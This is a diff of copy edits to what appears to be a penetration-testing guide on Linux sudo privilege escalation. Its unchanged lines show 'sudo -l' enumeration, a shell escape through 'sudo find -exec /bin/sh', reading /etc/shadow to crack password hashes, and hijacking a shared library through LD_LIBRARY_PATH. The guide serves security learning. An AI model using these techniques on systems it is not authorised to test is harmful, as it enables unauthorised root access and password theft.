@@ -8,7 +8,7 @@ description: >-
 
 ## Finding sudo commands
 
-Simply using this command you get a list of command you can execute as other users.&#x20;
+Simply using this command you get a list of commands you can execute as other users.&#x20;
 
 ```bash
 sudo -l
@@ -20,7 +20,7 @@ If you get any error message like these, it means you probably cannot use this t
 
 > \<username> is not in the sudoers file. This incident will be reported.
 
-In the best case scenario, you can run any command (even `sudo /bin/bash`) as root (without a password):
+In the best-case scenario, you can run any command (even `sudo /bin/bash`) as root (without a password):
 
 ```bash
 Matching Defaults entries for <username> on <machine>:
@@ -30,7 +30,7 @@ User <username> may run the following commands on <machine>:
     (ALL) NOPASSWD: ALL
 ```
 
-Another example is if you can only execute a certain program, or the `NOPASSWD` tag is not set meaning you do need the users password.&#x20;
+Another example is if you can only execute a certain program or the `NOPASSWD` tag is not set meaning you do need the user's password.&#x20;
 
 ```bash
 Matching Defaults entries for <username> on <machine>:
@@ -54,7 +54,7 @@ Then just use the command to get a shell. With the `/usr/bin/find` binary it wou
 sudo find . -exec /bin/sh \; -quit
 ```
 
-If the binary does not allow you to get a shell instantly, you can try other things like file read to read the `/etc/shadow` file containing password hashes. More information about cracking these shadow hashes in [#cracking-shadow-hashes](../../cryptography/hashing/cracking-hashes.md#cracking-shadow-hashes "mention").&#x20;
+If the binary does not allow you to get a shell instantly, you can try other things like file reading to read the `/etc/shadow` file containing password hashes. More information about cracking these shadow hashes in [#cracking-shadow-hashes](../../cryptography/hashing/cracking-hashes.md#cracking-shadow-hashes "mention").&#x20;
 
 ### env\_keep
 
@@ -132,7 +132,7 @@ void hijack() {
 ```
 {% endcode %}
 
-Then we compile it again to a library, and set the `LD_LIBRARY_PATH` to a directory containing our malicious library:
+Then we compile it again to a library and set the `LD_LIBRARY_PATH` to a directory containing our malicious library:
 
 ```shell-session
 $ gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
